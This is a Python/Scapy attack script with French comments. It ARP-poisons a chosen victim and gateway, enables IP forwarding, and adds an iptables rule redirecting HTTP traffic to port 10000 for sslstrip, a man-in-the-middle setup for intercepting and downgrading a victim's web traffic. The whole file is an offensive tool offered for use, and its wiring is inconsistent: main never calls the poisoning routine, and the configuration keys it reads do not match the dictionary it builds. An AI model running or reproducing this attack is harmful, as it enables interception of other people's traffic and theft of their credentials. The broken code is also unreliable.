#!/usr/bin/python

from scapy.all import *
from argparse import ArgumentParser

import os

TIMEOUT = 2
RETRY = 10


#Fonction HELP pour les arguments

def set_configs():

    parser = ArgumentParser ( )

    # Definitions des aides pour les arguments
    parser.add_argument ( '-t' ,
                          dest='victime' ,
                          required=True ,
                          type=str ,
                          help='L\'adresse IP de la victime' )

    parser.add_argument ( '-g' ,
                          dest='gateway' ,
                          required=True ,
                          type=str ,
                          help='L\'adresse de la gateway ' )

    parser.add_argument ( '-i' ,
                          dest='interface' ,
                          required=True ,
                          type=str ,
                          help='L\'interface a utilise' )

    args = parser.parse_args ( )

    # Creation d'un dico
    return {

        'victime': {

            'ip': args.victime ,
            'mac': ip_to_mac ( args.victime ) ,
        } ,

        'gateway': {
            'ip': args.gateway ,
            'mac': ip_to_mac ( args.gateway ) ,
        } ,

        'iface': args.interface ,
    }


# Activer le routage des paquets IP
def enable_packet_forwarding():
    with open ( '/proc/sys/net/ipv4/ip_forward' , 'w' ) as fd:
        fd.write ( '1' )


# Desactiver le routage des paquets IP
def disable_packet_forwarding():
    with open ( '/proc/sys/net/ipv4/ip_forward' , 'w' ) as fd:
        fd.write ( '0' )


# Utilisation IPTABLES pour sslstip ; port 10000
def enable_http_redirection():
    print '[*] Redirige tout le trafic du port tcp80 vers le port  10000'

    os.system ( 'iptables -v -t nat  -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000' )


# Suppression des regles iptables et remise a 0
def disable_http_redirection():
    print '[*] Supprime la redirection HTTP '

    os.system ( 'iptables -v --flush' )
    os.system ( 'iptables -v --table nat --flush' )
    os.system ( 'iptables -v --delete-chain' )
    os.system ( 'iptables -v --table nat --delete-chain' )


# DEbut
def poison_victime(configs):
    # Recuperes les infos depuis les dicos

    victime_mac = configs[ 'victime_mac' ]
    gateway_mac = configs[ 'gateway_mac' ]

    victime_ip = configs[ 'victime_ip' ]
    gateway_ip = configs[ 'gateway_ip' ]

    # cree la structure de la trame
    victime_arp = ARP ( )
    gateway_arp = ARP ( )

    # Envoie des reponses ARP
    victime_arp.op = 2
    gateway_arp.op = 2

    # Parametre l'adresse mac destination
    victime_arp.hwdst = victime_mac
    gateway_arp.hwdst = gateway_mac

    # parametre l'adresse ip destination
    victime_arp.pdst = victime_ip
    gateway_arp.pdst = gateway_ip

    # parametre l'adresse ip source
    victime_arp.psrc = gateway_ip
    gateway_arp.psrc = victime_ip

    # Boucle infinie pour continuer l'attaque
    while True:

        try:

            print '[*] Attaque ECLAIRE !'

            # Envoies des attaques sur la victime et sur la gateway
            send ( victime_arp )
            send ( gateway_arp )

            # On cherche dans le traffic les reponses du spoof
            sniff ( filter='arp and host %s or %s' % \
                           (gateway_ip , victime_ip) , count=1 )


        #Tant que l'utilisateur ne fait pas Ctrl-c
        except KeyboardInterrupt:
            break

    print '[*]ENJOYYYYYYYYYYYYYYYYYYYYYYYYY! '


# Restauration des tables ARP de la victime et de la gateway
def restore_victime(configs):
    victime_mac = configs[ 'victime_mac' ]
    gateway_mac = configs[ 'gateway_mac' ]

    victime_ip = configs[ 'victime_ip' ]
    gateway_ip = configs[ 'gateway_ip' ]

    # Creation des paquets
    send(ARP(op=2, pdst=victime_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=3)
    send(ARP(op=2, pdst=gateway_ip, psrc=victime_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victime_mac), count=3)

# Demande de la mac

def ip_to_mac(ip , retry=RETRY , timeout=TIMEOUT):
    arp = ARP ( )

    # 1 pour requete
    arp.op = 1

    arp.hwdst = 'ff:ff:ff:ff:ff:ff'
    arp.pdst = ip

    response , unanswered = sr ( arp , retry=retry , timeout=timeout )

    # Analyse de la requete en regardant dans la couche 2
    for s , r in response:
        return r[ ARP ].underlayer.src

    #Retour Failed
    return None


# Tableau de controle d'attaque
def poison(configs):
    enable_packet_forwarding ( )
    enable_http_redirection ( )


# Tableau de remise a 0
def antidote(configs):
    disable_http_redirection ( )
    disable_packet_forwarding ( )


def main():
    configs = set_configs ( )

    conf.iface = configs[ 'iface' ]

    try:
        poison ( configs )
    except KeyboardInterrupt:
        pass

    antidote ( configs )


if __name__ == '__main__':
    main ( )
